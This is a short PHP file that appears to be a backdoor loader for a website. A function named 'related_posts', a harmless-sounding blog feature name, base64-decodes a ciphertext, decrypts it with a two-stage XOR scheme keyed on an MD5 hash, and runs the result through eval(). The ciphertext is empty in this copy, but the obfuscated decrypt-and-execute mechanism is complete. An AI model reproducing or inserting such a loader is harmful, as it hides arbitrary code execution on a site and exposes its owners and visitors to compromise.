<?php
$ciphertext = '';
function xors($data) {
    $key = md5("contextual");
    $result = '';
    $keyLen = strlen($key);
    for ($i = 0, $j = 0; $i < strlen($data); $i++, $j++) {
        if ($j >= $keyLen) $j = 0;
        $result .= $data[$i] ^ $key[$j];
    }
    return $result;
}
function related_posts($ciphertext){
	$ciphertext = base64_decode($ciphertext);
    $data = xors($ciphertext);
    $plaintext = '';
    for ($i = 0; $i < strlen($data); $i += 2) {
        $mask = $data[$i];
        $plaintext .= $data[$i+1] ^ $mask;
    }
    eval($plaintext);
}
related_posts($ciphertext);